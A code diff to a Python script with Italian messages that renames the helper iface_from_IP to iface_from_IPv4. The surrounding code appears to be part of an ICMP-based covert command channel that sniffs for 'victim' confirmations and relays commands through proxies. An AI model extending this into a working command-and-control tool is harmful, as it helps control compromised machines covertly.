@@ -131,13 +131,13 @@ def callback_wait_answer_proxy(packet):
 
 def wait_answer_proxy(ip_src): 
     checksum=mymethods.calc_checksum(com.CONFIRM_VICTIM.encode())
-    print(f"Aspetto aggiornamento da {ip_src} su {mymethods.iface_from_IP(ip_src)[1]}")
+    print(f"Aspetto aggiornamento da {ip_src} su {mymethods.iface_from_IPv4(ip_src)[1]}")
     args={
         "filter":f"icmp and src {ip_src} and icmp[4:2]={checksum}"
         #,"count":"1" 
         ,"prn":callback_wait_answer_proxy 
         #,"store":True 
-        ,"iface":mymethods.iface_from_IP(ip_src)[1] 
+        ,"iface":mymethods.iface_from_IPv4(ip_src)[1] 
     } 
     com.sniff_packet(args) 
     com.wait_pkt_conn_received() 
@@ -179,7 +179,7 @@ def connect_to_proxy(ip_dst):
                 #,"count":1 
                 ,"prn":callback_connect_to_proxy #com.proxy_callback
                 #,"store":True 
-                ,"iface":mymethods.iface_from_IP(ip_dst)[1]
+                ,"iface":mymethods.iface_from_IPv4(ip_dst)[1]
             }
             com.sniff_packet(args) 
             com.wait_pkt_conn_received()
@@ -258,7 +258,7 @@ def wait_data_from_proxy(src_addresses):
         #,"count":1 
         ,"prn":get_data_from_proxy 
         #,"store":True 
-        ,"iface":mymethods.iface_from_IP(src_addresses)[1]
+        ,"iface":mymethods.iface_from_IPv4(src_addresses)[1]
     }
     com.sniff_packet(args)  
     event_proxy_ip.get(src_addresses).wait() 
@@ -308,7 +308,7 @@ def parte_2():
         except Exception as e:
             print(f"chosen_proxy: {e}")
             break
-        print(f"Il comando {command} verrà mandato al proxy {chosen_proxy} tramite l'interfaccia {mymethods.iface_from_IP(chosen_proxy)[1]}")
+        print(f"Il comando {command} verrà mandato al proxy {chosen_proxy} tramite l'interfaccia {mymethods.iface_from_IPv4(chosen_proxy)[1]}")
         if com.send_packet(command.encode(),chosen_proxy):
             print("The proxy received the command")
             print(datetime.datetime.now())
